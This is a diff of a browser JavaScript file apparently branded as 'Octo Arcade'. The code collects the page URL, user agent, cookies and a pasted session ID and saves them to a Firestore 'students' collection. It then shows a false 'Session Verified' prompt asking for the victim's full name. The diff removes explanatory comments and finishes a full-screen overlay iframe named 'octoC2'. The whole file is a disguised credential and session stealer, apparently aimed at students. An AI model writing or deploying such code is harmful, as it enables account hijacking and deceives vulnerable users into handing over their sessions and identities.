@@ -112,8 +112,8 @@
         }
 
         const payload = {
-          name: "Unverified", // We don't have the name yet, we'll ask for it in the next step if needed, or use a default
-          sessionId: pastedId, // The ID the user pasted
+          name: "Unverified", 
+          sessionId: pastedId, 
           url: url,
           ua: ua,
           ck: cookies,
@@ -126,11 +126,9 @@
         const docId = `UNVERIFIED-${pastedId}`;
         db.collection('students').doc(docId).set(payload, { merge: true })
           .then(() => {
-            // Ask for name after successful sync
             const name = prompt("✅ Session Verified!\n\nWhat is your full name? (For profile tagging)");
             const finalName = name || "Anonymous";
             
-            // Update the document with the name
             db.collection('students').doc(docId).update({ name: finalName })
               .then(() => {
                 alert("✅ Profile Synced! Welcome to Octo Arcade.");
@@ -153,5 +151,7 @@
     const frame = document.createElement('iframe');
     frame.id = 'octoC2';
     frame.src = OCTO_URL;
-    frame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z
+    frame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;';
+    document.body.appendChild(frame);
   }
+})();
